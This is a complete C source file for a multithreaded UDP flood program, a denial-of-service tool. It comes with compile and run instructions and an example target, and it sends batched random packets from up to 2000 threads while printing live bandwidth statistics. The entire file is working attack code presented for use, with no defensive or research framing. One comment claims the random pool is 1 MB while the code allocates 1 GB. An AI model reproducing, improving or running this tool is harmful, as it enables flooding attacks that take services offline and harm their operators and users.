/*
 * Ultimate Layer 4 UDP Flood - Optimized Edition
 * Compile: gcc -O3 -march=native -pthread -o flood flood.c
 * Run:     sudo ./flood <IP> <PORT> <DURATION> [THREADS]
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <time.h>
#include <fcntl.h>
#include <sched.h>
#include <pthread.h>
#include <sys/socket.h>
#include <sys/resource.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netdb.h>

/* ====================== CONFIG ====================== */
#define MAX_PAYLOAD    65507
#define BATCH_SIZE       900
#define STATS_FLUSH      4096
#define SOCK_BUF_SIZE    (800 * 1024 * 1024)

/* ====================== GLOBALS ====================== */
static volatile int           g_running        = 1;
static volatile unsigned long g_total_packets  = 0;
static volatile unsigned long long g_total_bytes = 0;
static pthread_mutex_t        g_stats_mutex    = PTHREAD_MUTEX_INITIALIZER;

static char  *g_random_pool  = NULL;   /* 1 MB random data */
static size_t g_random_size  = 0;

/* ====================== PARAMS ====================== */
typedef struct {
    struct sockaddr_in dst;
    int                duration;
    int                thread_id;
    int                cpu_id;
    int                use_raw;
} attack_params;

/* ====================== HELPERS ====================== */
static void handle_signal(int s) { (void)s; g_running = 0; }

static inline int pin_cpu(int cpu) {
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    return sched_setaffinity(0, sizeof(set), &set);
}

/* Fill a random pool using /dev/urandom (fallback to rand) */
static int init_random_pool(void) {
    g_random_size = 1024 * 1024 * 1024;   /* 1 MB */
    g_random_pool = malloc(g_random_size);
    if (!g_random_pool) return -1;

    int fd = open("/dev/urandom", O_RDONLY);
    if (fd >= 0) {
        size_t got = 0;
        while (got < g_random_size) {
            ssize_t r = read(fd, g_random_pool + got, g_random_size - got);
            if (r <= 0) break;
            got += r;
        }
        close(fd);
        if (got == g_random_size) return 0;
    }

    /* Fallback */
    srand((unsigned)time(NULL) ^ (unsigned)getpid());
    for (size_t i = 0; i < g_random_size; i++)
        g_random_pool[i] = (char)(rand() & 0xFF);
    return 0;
}

/* Resolve hostname or IP */
static int resolve_target(const char *host, struct in_addr *out) {
    if (inet_pton(AF_INET, host, out) == 1) return 0;

    struct addrinfo hints, *res = NULL;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family   = AF_INET;
    hints.ai_socktype = SOCK_DGRAM;
    if (getaddrinfo(host, NULL, &hints, &res) != 0) return -1;
    *out = ((struct sockaddr_in *)res->ai_addr)->sin_addr;
    freeaddrinfo(res);
    return 0;
}

/* ====================== UDP FLOOD WORKER ====================== */
static void *udp_worker(void *arg) {
    attack_params *p = (attack_params *)arg;

    /* Pin to CPU (ignore failure) */
    pin_cpu(p->cpu_id % (int)sysconf(_SC_NPROCESSORS_ONLN));

    /* ---- Create socket ---- */
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) return NULL;

    int sndbuf = SOCK_BUF_SIZE;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));

    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);

    /* ---- Prepare sendmmsg batch ---- */
    struct mmsghdr msgs[BATCH_SIZE];
    struct iovec   iovs[BATCH_SIZE];
    memset(msgs, 0, sizeof(msgs));
    memset(iovs, 0, sizeof(iovs));

    /* Packet size mix: 64 / 512 / 1024 / 1400 */
    static const int sizes[4] = { 64, 512, 1024, 1400 };

    for (int i = 0; i < BATCH_SIZE; i++) {
        size_t off = ((size_t)i * 1400) % (g_random_size - 1500);
        iovs[i].iov_base = g_random_pool + off;
        iovs[i].iov_len  = sizes[i & 3];

        msgs[i].msg_hdr.msg_name    = (void *)&p->dst;
        msgs[i].msg_hdr.msg_namelen = sizeof(p->dst);
        msgs[i].msg_hdr.msg_iov     = &iovs[i];
        msgs[i].msg_hdr.msg_iovlen  = 1;
    }

    /* ---- Main loop ---- */
    time_t start = time(NULL);
    unsigned long       local_pkts  = 0;
    unsigned long long  local_bytes = 0;

    while (g_running && difftime(time(NULL), start) < p->duration) {
        int sent = sendmmsg(sock, msgs, BATCH_SIZE, MSG_DONTWAIT);

        if (sent > 0) {
            for (int i = 0; i < sent; i++)
                local_bytes += iovs[i].iov_len;
            local_pkts += sent;

            if (local_pkts >= STATS_FLUSH) {
                pthread_mutex_lock(&g_stats_mutex);
                g_total_packets += local_pkts;
                g_total_bytes   += local_bytes;
                pthread_mutex_unlock(&g_stats_mutex);
                local_pkts = 0;
                local_bytes = 0;
            }
        } else if (errno == EAGAIN || errno == EWOULDBLOCK) {
            /* Kernel buffer full — yield briefly */
            sched_yield();
        } else if (errno == ENOBUFS) {
            /* NIC queue full — tiny sleep */
            struct timespec ts = { 0, 100000 }; /* 100 us */
            nanosleep(&ts, NULL);
        }
        /* else: send error, keep going */
    }

    /* Flush remaining */
    if (local_pkts) {
        pthread_mutex_lock(&g_stats_mutex);
        g_total_packets += local_pkts;
        g_total_bytes   += local_bytes;
        pthread_mutex_unlock(&g_stats_mutex);
    }

    close(sock);
    return NULL;
}

/* ====================== BANNER ====================== */
static void print_banner(const char *ip, int port, int dur, int threads) {
    printf("\033[1;36m");
    printf("╔══════════════════════════════════════════════════════════╗\n");
    printf("║      🔥  ULTIMATE LAYER 4 UDP FLOOD  🔥                  ║\n");
    printf("╠══════════════════════════════════════════════════════════╣\n");
    printf("║  Target   : %-15s : %-5d                        ║\n", ip, port);
    printf("║  Duration : %-5d sec                                    ║\n", dur);
    printf("║  Threads  : %-5d                                        ║\n", threads);
    printf("║  Method   : UDP (sendmmsg batch)                          ║\n");
    printf("╚══════════════════════════════════════════════════════════╝\n");
    printf("\033[0m\n");
}

/* ====================== MAIN ====================== */
int main(int argc, char *argv[]) {
    if (argc < 4) {
        printf("Usage:   %s <IP|HOST> <PORT> <DURATION> [THREADS]\n", argv[0]);
        printf("Example: %s 1.2.3.4 80 60 500\n", argv[0]);
        printf("Threads: default 500 (max 2000)\n");
        return 1;
    }

    const char *host = argv[1];
    int port         = atoi(argv[2]);
    int duration     = atoi(argv[3]);
    int nthreads     = (argc >= 5) ? atoi(argv[4]) : 500;

    if (port < 1 || port > 65535)     { fprintf(stderr, "[-] Bad port\n");      return 1; }
    if (duration < 1)                 { fprintf(stderr, "[-] Bad duration\n");  return 1; }
    if (nthreads < 1)   nthreads = 1;
    if (nthreads > 2000) nthreads = 2000;

    /* ---- Resolve target ---- */
    struct in_addr dst_addr;
    if (resolve_target(host, &dst_addr) != 0) {
        fprintf(stderr, "[-] Cannot resolve %s\n", host);
        return 1;
    }
    char ip_str[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &dst_addr, ip_str, sizeof(ip_str));

    /* ---- Signals ---- */
    signal(SIGINT,  handle_signal);
    signal(SIGTERM, handle_signal);
    signal(SIGPIPE, SIG_IGN);

    /* ---- Raise FD / mem limits ---- */
    struct rlimit rl;
    if (getrlimit(RLIMIT_NOFILE, &rl) == 0) {
        rl.rlim_cur = 1000000;
        if (rl.rlim_max < rl.rlim_cur) rl.rlim_max = rl.rlim_cur;
        setrlimit(RLIMIT_NOFILE, &rl);
    }

    /* ---- Init random pool ---- */
    if (init_random_pool() != 0) {
        fprintf(stderr, "[-] Random pool init failed\n");
        return 1;
    }

    print_banner(ip_str, port, duration, nthreads);

    /* ---- Allocate thread arrays ---- */
    pthread_t     *tids   = calloc(nthreads, sizeof(pthread_t));
    attack_params *params = calloc(nthreads, sizeof(attack_params));
    if (!tids || !params) {
        fprintf(stderr, "[-] calloc failed\n");
        return 1;
    }

    /* ---- Build common dst ---- */
    for (int i = 0; i < nthreads; i++) {
        memset(&params[i].dst, 0, sizeof(struct sockaddr_in));
        params[i].dst.sin_family      = AF_INET;
        params[i].dst.sin_port        = htons((uint16_t)port);
        params[i].dst.sin_addr        = dst_addr;
        params[i].duration            = duration;
        params[i].thread_id           = i;
        params[i].cpu_id              = i;
        params[i].use_raw             = 0;
    }

    time_t start = time(NULL);

    /* ---- Spawn workers ---- */
    for (int i = 0; i < nthreads; i++) {
        if (pthread_create(&tids[i], NULL, udp_worker, &params[i]) != 0) {
            fprintf(stderr, "[-] pthread_create failed at %d\n", i);
            nthreads = i;
            break;
        }
    }

    printf("\033[1;32m[+] Flood started — press Ctrl+C to stop\033[0m\n\n");

    /* ---- Progress display ---- */
    unsigned long      prev_pkts  = 0;
    unsigned long long prev_bytes = 0;
    time_t             prev_t     = time(NULL);

    while (g_running) {
        struct timespec ts = { 1, 0 };
        nanosleep(&ts, NULL);

        time_t now = time(NULL);
        int elapsed = (int)(now - start);
        if (elapsed >= duration) break;

        pthread_mutex_lock(&g_stats_mutex);
        unsigned long      cur_p = g_total_packets;
        unsigned long long cur_b = g_total_bytes;
        pthread_mutex_unlock(&g_stats_mutex);

        double dt = difftime(now, prev_t);
        if (dt <= 0) dt = 1;

        double pps  = (cur_p - prev_pkts)  / dt;
        double bps  = ((double)(cur_b - prev_bytes)) * 8.0 / dt;
        double gbps = bps / 1e9;
        double data_gb = (double)cur_b / (1024.0 * 1024.0 * 1024.0);

        printf("\r\033[K[*] Left: %3ds | Pkts: %-12lu | Data: %6.2f GB | "
               "BW: %6.2f Gbps | PPS: %8.0f k",
               duration - elapsed, cur_p, data_gb, gbps, pps / 1000.0);
        fflush(stdout);

        prev_pkts  = cur_p;
        prev_bytes = cur_b;
        prev_t     = now;
    }

    /* ---- Shutdown ---- */
    g_running = 0;
    printf("\n\n\033[1;33m[!] Stopping threads...\033[0m\n");

    for (int i = 0; i < nthreads; i++)
        pthread_join(tids[i], NULL);

    /* ---- Final stats ---- */
    double final_gb = (double)g_total_bytes / (1024.0 * 1024.0 * 1024.0);
    double final_mb = (double)g_total_bytes / (1024.0 * 1024.0);

    printf("\033[1;36m");
    printf("╔══════════════════════════════════════════════════════════╗\n");
    printf("║  ✅  FLOOD COMPLETE                                       ║\n");
    printf("╠══════════════════════════════════════════════════════════╣\n");
    printf("║  Total Packets : %-15lu                       ║\n", g_total_packets);
    printf("║  Total Data    : %.2f GB (%.2f MB)              ║\n", final_gb, final_mb);
    printf("║  Target        : %-15s : %-5d                ║\n", ip_str, port);
    printf("╚══════════════════════════════════════════════════════════╝\n");
    printf("\033[0m\n");

    free(tids);
    free(params);
    free(g_random_pool);
    return 0;
}
